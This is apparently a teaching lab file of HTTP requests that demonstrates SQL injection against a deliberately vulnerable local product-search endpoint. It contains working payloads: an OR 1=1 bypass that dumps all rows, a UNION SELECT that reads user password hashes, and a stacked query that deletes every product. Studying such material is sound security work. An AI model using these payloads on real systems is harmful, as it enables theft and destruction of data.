### =============================================================
### OWASP A03 – Injection (SQL Injection)
### =============================================================
### The search parameter ?q= is embedded into a raw SQL statement
### without any sanitisation:
###   SELECT * FROM Products WHERE Name LIKE '%{q}%'
###
### Attack vectors:
###   (a) Exfiltrate all rows (OR 1=1)
###   (b) Read other tables (UNION-based)
###   (c) Delete data (stacked query)
### =============================================================

@baseUrl = http://localhost:5218


### --- Normal request (reference) ---
# Search for "laptop" – expected result: 1 product
GET {{baseUrl}}/products/search?q=laptop

###

### --- (a) Boolean-based bypass: exfiltrate every product ---
# The condition becomes always true: '%' OR '1'='1
# Expected (secure): only products containing "' OR '1'='1" → 0 results
# Actual:            EVERY product in the database ✓ VULNERABILITY
#
# The query becomes: ... WHERE Name LIKE '%' OR '1'='1%' ...
GET {{baseUrl}}/products/search?q=' OR '1'='1

###

### --- (b) UNION-based: read another table ---
# Reads usernames and password hashes from the Users table.
# SQLite UNION: the column count must match (Products has 6 columns).
# The query becomes: ... LIKE '%x%' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--
# Mapping: Id→Id, Username→Name, Email→Description, 0→Price, 0→Stock, PasswordHash→Category
GET {{baseUrl}}/products/search?q=x' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--

###

### --- (c) Destructive: delete every product ---
# ⚠️ WARNING: this really deletes every product from the in-memory database!
#    Afterwards GET /products returns an empty array.
#    Restart the app to restore the seed data.
#
# The query becomes: ... LIKE '%x'; DELETE FROM Products;--'%'
GET {{baseUrl}}/products/search?q=x'; DELETE FROM Products;--
